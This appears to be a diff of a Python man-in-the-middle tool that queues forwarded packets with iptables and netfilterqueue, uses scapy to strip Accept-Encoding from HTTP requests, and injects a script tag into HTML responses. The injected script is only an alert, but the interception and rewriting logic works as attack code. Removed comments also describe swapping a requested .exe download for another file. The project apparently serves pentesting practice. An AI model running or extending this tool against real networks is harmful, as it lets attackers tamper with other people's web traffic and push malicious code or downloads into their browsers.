@@ -1,5 +1,3 @@
-# TODO: Refactor code
-
 #!usr/bin/env python
 
 #########################################################################
@@ -12,22 +10,7 @@
 # sudo pip3 install --upgrade -U git+https://github.com/kti/python-netfilterqueue 
 #########################################################################
 
-
-# Steps to test this tool
-# 1. cd /var/www/html
-# 2. sudo touch testfile.exe
-# 3. sudo python3 -m http.server 80
-# 4. run this script with superuser priviliges.
-# 5. open any browser
-# 6. visit localhost or your host ip to check whether site is up.
-# 7. request localhost/testfile.exe
-# 8. now you should get prompt to download brave browser instead of testfile.exe
-
-
-from os import remove
-from struct import pack
 from subprocess import call
-
 import netfilterqueue
 import scapy.all as scapy
 from re import sub
@@ -41,8 +24,8 @@ def forward_packets():
 
     call('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
     # for local host
-    call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
-    call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
+    # call('sudo iptables -I INPUT -j NFQUEUE --queue-num 0', shell=True)
+    # call('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0', shell=True)
     
 
 
@@ -74,34 +57,37 @@ def process_packet(packet):
     '''
     scapy_pkt = scapy.IP(packet.get_payload())
     if scapy_pkt.haslayer(scapy.Raw):
+
+        load = scapy_pkt[scapy.Raw].load
+        tampered_load = b'unchanged load'
+        new_payload = b'unchanged payload'
+
         if scapy_pkt[scapy.TCP].dport == 80:
             print('[*] Request Detected!')
-            # print(scapy_pkt.show())
-            tampered_load = sub(b'Accept-Encoding:.*?\\r\\n',b'', scapy_pkt[scapy.Raw].load)
-            new_pkt = set_load(scapy_pkt, tampered_load)
-            packet.set_payload(bytes(new_pkt))
+            tampered_load = sub(b'Accept-Encoding:.*?\\r\\n',b'', load)
+            
 
         elif scapy_pkt[scapy.TCP].sport == 80:
             print('[*] Response Detected!')
-            load = scapy_pkt[scapy.Raw].load.decode('utf-8', 'ignore')
+            load = load.decode('utf-8', 'ignore')
             load = load.replace('</BODY>', '</body>')
             if '</body>' in load:
                 print('\n[+] Script/Code Injected!!\n')
-                modified_load = load.replace('</body>', '<script>alert("Payload Added!!")</script> </body>')
-                modified_load = modified_load.encode('utf-8', 'ignore')
-                malacious_packet = set_load(scapy_pkt, modified_load)
-                print(malacious_packet.show())
-                #TODO: figure out a way to send the payload, we've successfully created a packet.
-                #TODO: encode the below line into bytes readable form for the browser.
-                packet.set_payload(bytes(malacious_packet))
-        
+                tampered_load = load.replace('</body>', '<script>alert("Payload Added!!")</script> \n</body>')
+                tampered_load = tampered_load.encode('utf-8', 'ignore')
+
+        if load != scapy_pkt[scapy.Raw].load: 
+            if tampered_load == b'unchanged load':  
+                tampered_load = scapy_pkt[scapy.Raw].load
+            
+            new_payload = set_load(scapy_pkt, tampered_load)
+            packet.set_payload(bytes(new_payload))
+            print(new_payload.show())
+
     packet.accept()
     
 
 ############################### Main ############################### 
-
-js_code = "<script>alert('Hola I am a pentester')</script>"
-
 
 reset_config()
 
@@ -113,7 +99,6 @@ print('[*] packet receiver configured successfully.\n')
 print('[*] Creating Queue to start receiving packets.')
 try:
     queue = netfilterqueue.NetfilterQueue()
-    # Bind queue with queue-number 0
     queue.bind(0, process_packet)
     queue.run()
 
